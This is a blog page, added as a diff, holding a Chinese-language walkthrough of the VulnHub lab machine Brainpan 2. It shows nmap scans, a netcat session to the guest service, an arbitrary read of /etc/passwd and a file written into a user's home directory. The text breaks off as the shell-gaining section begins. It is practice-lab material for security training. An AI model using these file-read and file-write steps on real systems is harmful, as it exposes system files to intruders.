@@ -1,0 +1,594 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="名称名称：brainpan：2发行日期：2013年11月20日 下载 Download (Mirror): https:&#x2F;&#x2F;download.vulnhub.com&#x2F;brainpan&#x2F;brainpan2.zip Download (Torrent): https:&#x2F;&#x2F;download.vulnhub.com&#x2F;brainpan&#x2F;brainpan2.zip.torrent  描述12345678910">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub靶机渗透[brainpan2]">
+<meta property="og:url" content="https://fdlucifer.github.io/2020/02/01/brainpan2/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="名称名称：brainpan：2发行日期：2013年11月20日 下载 Download (Mirror): https:&#x2F;&#x2F;download.vulnhub.com&#x2F;brainpan&#x2F;brainpan2.zip Download (Torrent): https:&#x2F;&#x2F;download.vulnhub.com&#x2F;brainpan&#x2F;brainpan2.zip.torrent  描述12345678910">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub199.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub200.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg">
+<meta property="article:published_time" content="2020-01-31T18:53:02.000Z">
+<meta property="article:modified_time" content="2020-08-16T16:33:08.671Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="vulnhub靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub199.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2020/02/01/brainpan2/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2020/02/01/brainpan2/","path":"2020/02/01/brainpan2/","title":"vulnhub靶机渗透[brainpan2]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>vulnhub靶机渗透[brainpan2] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8D%E7%A7%B0"><span class="nav-number">1.</span> <span class="nav-text">名称</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD"><span class="nav-number">2.</span> <span class="nav-text">下载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%8F%E8%BF%B0"><span class="nav-number">3.</span> <span class="nav-text">描述</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="nav-number"></span> <span class="nav-text">免责声明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%BE%E5%AE%9A"><span class="nav-number"></span> <span class="nav-text">设定</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getshell"><span class="nav-number">2.</span> <span class="nav-text">getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">3.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">知识点总结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2020/02/01/brainpan2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="vulnhub靶机渗透[brainpan2] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          vulnhub靶机渗透[brainpan2]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2020-02-01 02:53:02" itemprop="dateCreated datePublished" datetime="2020-02-01T02:53:02+08:00">2020-02-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2020-08-17 00:33:08" itemprop="dateModified" datetime="2020-08-17T00:33:08+08:00">2020-08-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/vulnhub-walkthrough/" itemprop="url" rel="index"><span itemprop="name">vulnhub walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：brainpan：2<br>发行日期：2013年11月20日</p>
+<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
+<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9icmFpbnBhbi9icmFpbnBhbjIuemlw">https://download.vulnhub.com/brainpan/brainpan2.zip<i class="fa fa-external-link-alt"></i></span></li>
+<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9icmFpbnBhbi9icmFpbnBhbjIuemlwLnRvcnJlbnQ=">https://download.vulnhub.com/brainpan/brainpan2.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">_               _                           ___  </span><br><span class="line">| |             (_)                         |__ \ </span><br><span class="line">| |__  _ __ __ _ _ _ __  _ __   __ _ _ __      ) |</span><br><span class="line">| <span class="string">&#x27;_ \| &#x27;</span>__/ _` | | <span class="string">&#x27;_ \| &#x27;</span>_ \ / _` | <span class="string">&#x27;_ \    / / </span></span><br><span class="line"><span class="string">| |_) | | | (_| | | | | | |_) | (_| | | | |  / /_ </span></span><br><span class="line"><span class="string">|_.__/|_|  \__,_|_|_| |_| .__/ \__,_|_| |_| |____|</span></span><br><span class="line"><span class="string">                        | |                       </span></span><br><span class="line"><span class="string">                        |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                            by superkojiman  </span></span><br><span class="line"><span class="string">                 http://www.techorganic.com</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>使用此虚拟机，即表示您同意，对任何损失或损害不承担任何责任，包括但不限于间接或间接损失或损害，或由于或来自于此而产生的数据或利润损失而造成的任何损失或损害。与使用此软件的连接。<br>TL; DR：如果发生坏事，这不是我的错。</p>
+<h2 id="设定"><a href="#设定" class="headerlink" title="设定"></a>设定</h2><p>Brainpan已通过测试，可在以下虚拟机管理程序上运行：</p>
+<ul>
+<li>VMware Player 6.0.1</li>
+<li>VMWare Fusion 6.0.2</li>
+<li>VirtualBox 4.3.2</li>
+</ul>
+<p>检查以确保brainpan2.ova具有以下校验和，以便您知道下载的文件是否完整：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MD5：bf01f03ea0e7cea2553f74189ff35161SHA1：b46891cda684246832f4dbc80ec6e40a997af65a</span><br></pre></td></tr></table></figure>
+<p>将brainpan2.ova导入到您首选的管理程序中，并根据需要配置网络设置。<br>它会通过DHCP获得IP地址，建议在NAT内运行它，或者仅对主机OS可见，因为它容易受到攻击。<br>VulnHub独家.<br><a href="http%EF%BC%9A//blog.vulnhub.com/2013/11/competition-brainpan-2.html">博客文章</a></p>
+<span id="more"></span>
+
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.116</span><br><span class="line">Host is up (0.00027s latency).</span><br><span class="line">MAC Address: 08:00:27:6D:B8:70 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -v -sV -Pn -p- 192.168.56.116</span></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">9999/tcp  open  abyss?</span><br><span class="line">10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\HASEE&gt;nmap -v -sV -p 9999,10000 -A -T5 192.168.56.116</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">9999/tcp  open  abyss?</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   NULL:</span><br><span class="line">|     _| _|</span><br><span class="line">|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_|</span><br><span class="line">|     _|_| _| _| _| _| _| _| _| _| _| _| _|</span><br><span class="line">|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|</span><br><span class="line">|     [______________________ WELCOME TO BRAINPAN 2.0________________________]</span><br><span class="line">|_    LOGIN AS GUEST</span><br><span class="line">10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)</span><br><span class="line">|_http-server-header: SimpleHTTP/0.6 Python/2.7.3</span><br><span class="line">|_http-title: Hacking Trends</span><br></pre></td></tr></table></figure>
+
+<p>nc连接后然后根据具体提示输入命令，发现如下的信息，并能对文件进行一定的操作</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 192.168.56.116 9999</span></span><br><span class="line">_|                            _|                                        </span><br><span class="line">_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  </span><br><span class="line">_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</span><br><span class="line">                                            _|                          </span><br><span class="line">                                            _|</span><br><span class="line"></span><br><span class="line">[______________________ WELCOME TO BRAINPAN 2.0________________________]</span><br><span class="line">                             LOGIN AS GUEST                             </span><br><span class="line"></span><br><span class="line">                          &gt;&gt; GUEST</span><br><span class="line">                          ACCESS GRANTED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                             *  *  *  *                                </span><br><span class="line">    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.  </span><br><span class="line">    TYPE <span class="string">&quot;TELL ME MORE&quot;</span> FOR A LIST OF COMMANDS.  </span><br><span class="line">                             *  *  *  *                                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                          &gt;&gt; TELL ME MORE</span><br><span class="line">    FILES    HELP    VIEW       CREATE</span><br><span class="line">    USERS    MSG     SYSTEM     BYE</span><br><span class="line"></span><br><span class="line">                          &gt;&gt; FILES</span><br><span class="line">total 36</span><br><span class="line">-rwxr-xr-x 1 root   root   18424 Nov  4  2013 brainpan.exe</span><br><span class="line">-rw-r--r-- 1 root   root    1109 Nov  5  2013 brainpan.txt</span><br><span class="line">-rw-r--r-- 1 root   root     683 Nov  4  2013 notes.txt</span><br><span class="line">-rw-r--r-- 1 anansi anansi    12 Nov  5  2013 test-1</span><br><span class="line">-rwxrwxrwx 1 anansi anansi    19 Nov  5  2013 test-2</span><br><span class="line">                          &gt;&gt; VIEW</span><br><span class="line">    ENTER FILE TO DOWNLOAD: notes.txt</span><br><span class="line">TODO LIST</span><br><span class="line">---------</span><br><span class="line">reynard: </span><br><span class="line"> - Completed manpage. Read with groff or man.</span><br><span class="line"> - Renamed to brainpan.txt instead of brainpan.7.</span><br><span class="line"> - Fixed call to <span class="built_in">read</span> manpage: popen(<span class="string">&quot;man ./brainpan.txt&quot;</span>, <span class="string">&quot;r&quot;</span>); </span><br><span class="line"></span><br><span class="line">puck:</span><br><span class="line">Easiest way to display file contents is to just use popen(). Eg:</span><br><span class="line">popen(<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;/bin/man ./brainpan.7&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;/usr/bin/top&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">etc... </span><br><span class="line"></span><br><span class="line">anansi: </span><br><span class="line"> - Fixed a reported buffer overflow <span class="keyword">in</span> login <span class="keyword">in</span> version 1.0. </span><br><span class="line"> - Discovered buffer overflow <span class="keyword">in</span> the <span class="built_in">command</span> prompt, fixed as of version 2.0</span><br><span class="line"></span><br><span class="line">puck: look into loading a configuration file instead of hardcoding settings </span><br><span class="line"><span class="keyword">in</span> the server, version 1.8</span><br><span class="line">anansi: dropped configuration file - leave it hardcoded, version 1.9</span><br><span class="line">                          &gt;&gt; VIEW</span><br><span class="line">    ENTER FILE TO DOWNLOAD: /etc/passwd</span><br><span class="line">root:x:104:106:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">root :x:0:0:root:/var/root:/bin/bash</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">Debian-exim:x:101:103::/var/spool/exim4:/bin/false</span><br><span class="line">statd:x:102:65534::/var/lib/nfs:/bin/false</span><br><span class="line">sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">anansi:x:1000:1000:anansi,,,:/home/anansi:/bin/bash</span><br><span class="line">puck:x:1001:1001:puck,,,:/home/puck:/bin/bash</span><br><span class="line">reynard:x:1002:1002:reynard,,,:/home/reynard:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>太好了:)可以查看系统内部可以访问的任何文件。从文件列表中，发现uid是系统用户之一。尝试成功创建和读取其主目录中的文件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">                          &gt;&gt; CREATE</span><br><span class="line">    ENTER FILE TO CREATE: /home/anansi/lucifer11   </span><br><span class="line">    ENTER CONTENTS: content\lucifer11testcontents</span><br><span class="line">    FILE CREATED</span><br><span class="line">                          &gt;&gt; VIEW</span><br><span class="line">    ENTER FILE TO DOWNLOAD: /home/anansi/lucifer11</span><br><span class="line">content\lucifer11testcontents</span><br></pre></td></tr></table></figure>
+
+<p>这意味着可以读取用户获得许可的每个文件，并在可写目录中创建文件。检查了其他命令，但几乎所有命令尚未实现。guest用户不可用的很少。在那一刻，想起了HELP中的一句话引起了我的注意。</p>
